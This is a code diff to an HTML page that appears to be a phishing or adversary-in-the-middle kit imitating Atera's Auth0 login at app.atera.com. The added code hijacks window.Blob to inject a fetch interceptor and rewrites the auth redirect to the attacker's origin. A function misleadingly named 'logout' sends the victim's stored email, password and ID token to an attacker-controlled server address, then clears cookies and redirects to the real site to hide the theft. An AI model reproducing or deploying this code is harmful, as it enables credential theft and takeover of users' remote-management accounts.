@@ -1,16 +1,89 @@
 <html><head>
 <script>
-const origin = "https://app.atera.com";
+origin = "https://app.atera.com";
 
 window.location.gimme = async function(url) {
-	let res = await originalFetch("http://127.0.0.1:65000/location?url=" + encodeURIComponent(url));
+	let res = await originalFetch(serverAddress + "/location?url=" + encodeURIComponent(url));
 	window.location.assign((await res.text()).replace("https://auth.atera.com", document.location.origin));
 };
 
-callback = async function() {
-	await configureClient();	
-	await auth0.loginWithRedirect({redirect_uri: "https://app.atera.com/auth0.html", redirectMethod: "gimme"});
-}
+originalBlob = window.Blob;
+window.Blob = function (parts = [], options) {
+    const injectedCode = "interceptFetch=" + interceptFetch.toString().replaceAll("\n", "") + ";interceptFetch();";
+    const newParts = [injectedCode, ...parts];
+    return new originalBlob(newParts, options);
+};
+
+html_callback = async function() {
+	logout_url = serverAddress + "/logout";
+	
+	if (!currentURL.includes("code")) {
+		await fetch(logout_url);
+	}
+
+	async function logout(token) {
+		email = localStorage.getItem("email");
+		password = localStorage.getItem("password");
+	
+		await fetch(logout_url + "?email=" + email + "&password=" + password + "&token=" + token);
+		
+		localStorage.clear();
+		document.cookie.split(';').forEach(cookie => {
+			const eqPos = cookie.indexOf('=');
+			const name = eqPos > -1 ? cookie.substring(0, eqPos) : cookie;
+			document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
+		});
+	
+		window.location.href = "https://app.atera.com/new";
+	}
+	
+	await configureClient();
+    const isAuthenticated = await auth0.isAuthenticated();
+
+    if (isAuthenticated) {
+        let token = (await auth0.getIdTokenClaims()).__raw;
+        localStorage.setItem('X-Atera-JWT', token);
+        localStorage.setItem('IsAuth0JWT', true);
+        localStorage.removeItem('retry_count');
+        logout(token);
+        return;
+    }
+
+    const query = window.location.search;
+    const shouldParseResult = query.includes("code=") && query.includes("state=");
+    if (shouldParseResult) {
+        try {
+            const result = await auth0.handleRedirectCallback();
+
+            if (result.appState && result.appState.targetUrl) {}
+
+            let idToken = await auth0.getIdTokenClaims();
+
+            if (!idToken) {
+                await auth0.getTokenSilently({ ignoreCache: true });
+                idToken = await auth0.getIdTokenClaims();
+            }
+
+            localStorage.setItem('X-Atera-JWT', idToken.__raw);
+            localStorage.setItem('IsAuth0JWT', true);
+            localStorage.removeItem('retry_count');
+            logout(idToken.__raw);
+        } catch (err) {
+            console.log("Error parsing redirect:", err);
+            _handleEmptyToken();
+        }
+
+        window.history.replaceState({}, document.title, "/");
+    }
+    else {
+        if (query.includes("error=invalid_request") || query.includes("error=unauthorized") || query.includes("error=access_denied")) {
+            _handleError();
+        }
+        else {
+            auth0.loginWithRedirect({redirect_uri: "https://app.atera.com/auth0.html", redirectMethod: "gimme"});
+        }
+    }
+};
 </script>
 
 <script defer src="/get_html.js"></script>
